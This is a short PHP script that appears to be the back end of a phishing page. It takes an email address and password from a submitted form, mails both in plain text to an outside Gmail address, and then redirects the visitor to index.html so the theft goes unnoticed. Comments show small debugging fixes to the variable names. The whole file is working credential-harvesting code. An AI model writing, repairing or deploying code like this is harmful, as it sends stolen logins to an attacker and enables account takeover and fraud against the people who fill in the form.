<?php

$email = $_POST['email'];
$password = $_POST['password'];

// For debugging (optional) — comment out or remove before production
// echo "Email: ".$email."<br>";
// echo "Password: ".$password;

$email_from = 'nonreply@tesssting.com';

$email_subject = "New Form Submission";

$email_body = "User Email: $email.\n" .
              "User Password: $password.\n";

$to = "nxloaded@gmail.com";

$headers = "From: $email_from\r\n";

// Fix variable name: $visitor_email was undefined, replace with $email
$headers .= "Reply-To: $email\r\n";

// Send the email
mail($to, $email_subject, $email_body, $headers);

// Redirect to index.html after processing
header("Location: index.html");
exit();

?>